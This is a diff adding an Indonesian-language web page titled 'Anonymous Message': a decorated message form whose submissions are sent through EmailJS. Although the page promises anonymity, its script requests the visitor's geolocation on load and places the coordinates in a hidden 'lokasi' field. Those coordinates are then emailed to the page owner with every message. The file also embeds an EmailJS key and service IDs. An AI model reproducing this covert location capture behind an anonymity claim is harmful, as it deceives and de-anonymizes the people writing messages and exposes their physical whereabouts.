@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="id">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Pesan Anonim</title>
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2.6.4/dist/email.min.js"></script>
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      html,
+      body {
+        height: 100%;
+        font-family: Arial, sans-serif;
+        background: #fff;
+        overflow: hidden;
+      }
+
+      body {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        position: relative;
+      }
+
+      /* Background Bubble */
+      .bubble {
+        position: absolute;
+        border-radius: 50%;
+        opacity: 0.3;
+        animation: moveBubble 10s linear infinite alternate;
+        pointer-events: auto;
+        transition: transform 0.3s;
+      }
+
+      @keyframes moveBubble {
+        0% {
+          transform: translateY(0) rotate(0deg);
+        }
+        100% {
+          transform: translateY(-50px) rotate(360deg);
+        }
+      }
+
+      .container {
+        background: rgb(190, 120, 120);
+        padding: 2rem;
+        border-radius: 1rem;
+        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+        width: 100%;
+        max-width: 500px;
+        z-index: 10;
+        position: relative;
+      }
+
+      h2 {
+        margin-bottom: 1rem;
+        color: #fff;
+        text-align: center;
+      }
+
+      textarea {
+        width: 100%;
+        height: 150px;
+        padding: 1rem;
+        border: none;
+        border-radius: 0.5rem;
+        resize: vertical;
+        font-size: 1rem;
+      }
+
+      input[name="lokasi"] {
+        display: none;
+      }
+
+      button {
+        margin-top: 1rem;
+        width: 100%;
+        padding: 1rem;
+        background-color: hotpink;
+        color: white;
+        border: none;
+        border-radius: 0.5rem;
+        font-size: 1rem;
+        cursor: pointer;
+        transition: background 0.3s;
+      }
+
+      button:hover {
+        background-color: deeppink;
+      }
+
+      #emoji-container {
+        position: fixed;
+        bottom: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        pointer-events: none;
+        overflow: hidden;
+        z-index: 5;
+      }
+
+      @keyframes naik {
+        0% {
+          transform: translateY(0) rotate(0);
+          opacity: 1;
+        }
+        100% {
+          transform: translateY(-200px) rotate(360deg);
+          opacity: 0;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <!-- BUBBLE BACKGROUND -->
+    <div id="bubble-area"></div>
+
+    <!-- FORM -->
+    <div class="container">
+      <h2>Kirim Pesan</h2>
+      <form id="pesanForm">
+        <textarea
+          name="pesan"
+          placeholder="Tulis pesan kamu di sini..."
+          required
+        ></textarea>
+        <input type="text" name="lokasi" readonly />
+        <button type="submit">Kirim</button>
+      </form>
+    </div>
+
+    <!-- EMOJI LOVE -->
+    <div id="emoji-container"></div>
+
+    <script>
+      // Init EmailJS
+      (function () {
+        emailjs.init("LWJjQmDvyjkpeI5Ru");
+      })();
+
+      // Deteksi Lokasi
+      window.onload = function () {
+        if ("geolocation" in navigator) {
+          navigator.geolocation.getCurrentPosition(
+            function (position) {
+              const lokasiInput = document.querySelector(
+                'input[name="lokasi"]'
+              );
+              lokasiInput.value = `Lat: ${position.coords.latitude.toFixed(
+                5
+              )}, Lng: ${position.coords.longitude.toFixed(5)}`;
+            },
+            function (error) {
+              console.warn("Lokasi tidak diizinkan:", error.message);
+            }
+          );
+        }
+
+        // Bikin Bubble
+        const bubbleArea = document.getElementById("bubble-area");
+        const colors = ["#ff69b4", "#ffa07a", "#87cefa", "#dda0dd", "#90ee90"];
+        for (let i = 0; i < 10; i++) {
+          const bubble = document.createElement("div");
+          bubble.classList.add("bubble");
+          bubble.style.width = bubble.style.height = `${
+            Math.random() * 100 + 100
+          }px`;
+          bubble.style.left = `${Math.random() * 100}%`;
+          bubble.style.top = `${Math.random() * 100}%`;
+          bubble.style.backgroundColor =
+            colors[Math.floor(Math.random() * colors.length)];
+          bubbleArea.appendChild(bubble);
+
+          // Geser bubble saat disentuh
+          bubble.addEventListener("click", () => {
+            bubble.style.transform = `translate(${
+              Math.random() * 200 - 100
+            }px, ${Math.random() * 200 - 100}px) rotate(${
+              Math.random() * 360
+            }deg)`;
+          });
+        }
+      };
+
+      // Animasi Emoji Love
+      function munculinLove() {
+        for (let i = 0; i < 15; i++) {
+          const emoji = document.createElement("div");
+          emoji.innerText = "❤️";
+          emoji.style.position = "absolute";
+          emoji.style.bottom = "0";
+          emoji.style.left = Math.random() * 90 + "vw";
+          emoji.style.fontSize = `${Math.random() * 1.5 + 1}rem`;
+          emoji.style.animation = `naik ${
+            Math.random() * 2 + 1
+          }s ease-out forwards`;
+          emoji.style.zIndex = "9999";
+
+          document.getElementById("emoji-container").appendChild(emoji);
+
+          setTimeout(() => {
+            emoji.remove();
+          }, 3000);
+        }
+      }
+
+      // Submit Form
+      document
+        .getElementById("pesanForm")
+        .addEventListener("submit", function (e) {
+          e.preventDefault();
+
+          emailjs.sendForm("service_kk13eww", "template_lk9k7r8", this).then(
+            function () {
+              alert("Pesan berhasil dikirim!");
+              munculinLove();
+            },
+            function (error) {
+              alert("Gagal mengirim pesan: " + error.text);
+            }
+          );
+
+          this.reset();
+        });
+    </script>
+  </body>
+</html>
